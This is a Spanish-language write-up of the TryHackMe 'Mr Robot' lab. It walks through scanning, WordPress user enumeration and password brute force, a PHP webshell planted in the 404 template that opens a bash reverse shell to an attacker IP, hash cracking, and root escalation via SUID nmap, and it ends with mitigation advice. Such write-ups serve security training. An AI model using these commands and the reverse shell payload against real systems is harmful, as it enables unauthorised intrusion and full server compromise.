> **Máquina:** Mr Robot · **Plataforma:** TryHackMe · **SO:** Linux · **Dificultad:** Media

## 1. Reconocimiento

Se confirma la disponibilidad del objetivo con `ping` y se lanza un escaneo completo de puertos con detección de versiones, exportando el resultado:

```bash
nmap -sC -sV -p- --min-rate 5000 -n -Pn 10.201.89.1 -oN puertos
```

![Escaneo de puertos con Nmap](/assets/informes/mr-robot/img01.jpg)

El servidor expone HTTP y HTTPS, ambos con el mismo contenido: una web interactiva cuyo código fuente es únicamente JavaScript que reproduce contenido multimedia según la opción elegida.

![Contenido de la web](/assets/informes/mr-robot/img02.jpg)

Se ejecuta el script `http-enum` de Nmap para descubrir rutas ocultas:

```bash
nmap --script=http-enum.nse -p80 10.201.89.1
```

![Enumeración de rutas con http-enum](/assets/informes/mr-robot/img03.jpg)

Los resultados apuntan a una instalación de **WordPress**. La revisión de `robots.txt` revela dos recursos: un diccionario `fsocity.dic` y un archivo `.txt` con la primera bandera.

![Contenido de robots.txt y diccionario](/assets/informes/mr-robot/img04.jpg)

El diccionario contiene 858 160 palabras. Se optimiza eliminando duplicados para agilizar un futuro ataque de fuerza bruta, reduciéndolo a 11 451 entradas:

```bash
sort fsocity.dic | uniq > optimized_fsocity.dic
```

![Primera bandera](/assets/informes/mr-robot/img05.jpg)

Resumen del objetivo:

| Campo | Valor |
|---|---|
| IP | 10.201.89.1 |
| Sistema Operativo | Linux |
| Servicios | 80/HTTP · 443/HTTPS |
| Vectores | WordPress (fuerza bruta) · RCE plantilla 404 · SUID nmap |

## 2. Análisis y enumeración de usuarios

El panel de acceso se encuentra en `/wp-login`. Dado que WordPress devuelve mensajes de error distintos según exista o no el usuario, se aprovecha esa diferencia para enumerar usuarios válidos con **Burp Suite Intruder** y el diccionario optimizado.

Se intercepta la petición con el proxy de Burp:

![Interceptación con Burp Suite](/assets/informes/mr-robot/img06.jpg)

Se envía al Intruder y se define el campo objetivo del ataque:

![Configuración del ataque en Intruder](/assets/informes/mr-robot/img07.jpg)

Se carga el diccionario en la pestaña Payloads:

![Carga del diccionario](/assets/informes/mr-robot/img08.jpg)

El usuario válido resulta ser **Elliot**, el protagonista de la serie. Con el usuario identificado, se recupera la contraseña mediante **wpscan**:

```bash
wpscan --url http://10.201.89.1/ -U user.txt -P optimized_fsocity.dic
```

![Credenciales válidas obtenidas con wpscan](/assets/informes/mr-robot/img09.jpg)

## 3. Explotación

Con acceso al panel de WordPress, el objetivo es lograr ejecución de comandos en el servidor. Para ello se modifica la plantilla del error 404 del tema, de modo que se ejecute código propio cuando el sistema procese ese archivo PHP.

Se accede a *Appearance → Editor* y se selecciona la plantilla *404 Template*:

![Editor de temas de WordPress](/assets/informes/mr-robot/img10.jpg)

![Plantilla 404 del tema](/assets/informes/mr-robot/img11.jpg)

Se confirma que la versión del tema permite ejecución de comandos (RCE), por ejemplo `system('cat /etc/passwd');`. A continuación se sustituye el código por una webshell que lanza una reverse shell:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.80.105/9876 0>&1'");
```

![Sustitución del código por la webshell](/assets/informes/mr-robot/img12.jpg)

Con Netcat en escucha (`nc -lvp 9876`), se solicita una URL inexistente para forzar la ejecución de la plantilla 404, obteniendo la shell:

![Reverse shell recibida](/assets/informes/mr-robot/img13.jpg)

En el directorio `/home/robot/` se localizan dos archivos: la segunda bandera y unas credenciales en formato MD5.

![Archivos en /home/robot](/assets/informes/mr-robot/img14.jpg)

Se descifra el hash con **hashcat** y un diccionario:

```bash
echo "c3fcd3d76192e4007dfb496cca67e13b" > robot_creds
hashcat robot_creds /usr/share/wordlists/rockyou.txt
```

Para poder usar `su` se estabiliza la terminal con Python y se inicia sesión como el usuario `robot`:

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
su robot
```

## 4. Escalada de privilegios

Tras estabilizar la TTY, se enumeran los binarios con permiso **SUID**:

```bash
find / -perm -u=s -type f 2>/dev/null
```

![Binarios con permiso SUID](/assets/informes/mr-robot/img15.jpg)

Destaca el binario **nmap** con SUID, algo poco habitual. Aprovechando el modo interactivo de las versiones antiguas de nmap, se obtiene una shell como root:

```bash
nmap --interactive
!sh
```

![Escalada a root mediante nmap SUID](/assets/informes/mr-robot/img16.jpg)

Con ello se accede a la bandera final ubicada en `/root/`.

## 5. Herramientas utilizadas

Kali Linux, Nmap, Burp Suite, wpscan, Netcat, hashcat y GTFOBins como referencia.

## 6. Recomendaciones de mitigación

Unificar los mensajes de error de inicio de sesión de WordPress para impedir la enumeración de usuarios, aplicar contraseñas robustas y limitar los intentos de login, restringir la edición de temas desde el panel de administración y, muy especialmente, retirar el permiso SUID del binario nmap.
